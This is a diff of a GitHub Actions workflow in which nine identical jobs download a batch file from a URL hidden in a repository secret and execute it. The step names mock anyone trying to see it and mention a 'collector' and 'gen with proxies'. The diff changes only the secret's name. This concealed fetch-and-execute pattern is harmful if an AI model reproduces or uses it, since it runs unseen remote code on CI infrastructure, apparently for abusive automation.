@@ -13,7 +13,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -26,7 +26,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -39,7 +39,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -52,7 +52,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -65,7 +65,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -78,7 +78,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -91,7 +91,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -104,7 +104,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
@@ -117,7 +117,7 @@ jobs:
       - name: Installing and configuring gen with proxies (you thought this was public huh)
         run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
         env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID1 }}
 
       - name: running the collector 🔥🔥
         run: cmd /c Preparation.bat
